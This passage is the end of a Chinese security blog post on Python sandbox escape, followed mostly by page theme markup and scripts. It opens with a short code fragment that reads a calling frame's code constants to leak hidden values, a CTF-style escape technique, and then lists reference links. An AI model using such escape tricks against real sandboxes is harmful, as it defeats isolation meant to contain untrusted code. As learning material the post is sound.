class="hljs-built_in">str</span><br>    code=runner_frame.f_code.co_consts<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(code):<br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&#x27;,&#x27;</span>)<br>waff()<br></code></pre></td></tr></table></figure>
+<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> <em>参考</em></h3>
+<p><em><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/">https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/</a></em></p>
+<p><em><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13635">https://xz.aliyun.com/t/13635</a></em></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <p class="note note-warning">
+                <strong>本文作者: </strong><a href="/">fru1ts</a> <br>
+                <strong>本文链接: </strong><a href="https://fru1ts.github.io/2024/05/22/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://fru1ts.github.io/2024/05/22/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a> <br>
+                <strong>版权声明: </strong>本站均采用BY-SA协议，除特别声明外，转载请注明出处!
+                   </p>
+                   
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/28/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" title="SpEL表达式注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SpEL表达式注入</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/10/CRLF/" title="CRLF">
+                        <span class="hidden-mobile">CRLF</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","appKey":"PSBkctB8cKrR97yZLNXnJ0nj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        Total number of visits 
+        <span id="leancloud-site-pv"></span>
+         
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        Total number of visitors 
+        <span id="leancloud-site-uv"></span>
+         
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/star.js"></script>
+<script src="/js/love.js"></script>
+<script src="/js/duration.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
